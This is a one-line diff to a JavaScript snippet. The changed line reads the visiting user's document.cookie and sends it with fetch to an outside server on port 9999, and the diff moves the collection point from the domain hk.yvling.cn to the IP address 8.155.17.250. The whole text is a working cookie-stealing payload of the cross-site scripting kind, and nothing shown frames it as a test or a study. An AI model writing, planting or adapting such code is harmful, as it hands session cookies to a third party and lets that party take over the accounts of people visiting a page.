@@ -1,1 +1,1 @@
-fetch('http://hk.yvling.cn:9999?cookie=' + document.cookie);
+fetch('http://8.155.17.250:9999?cookie=' + document.cookie);
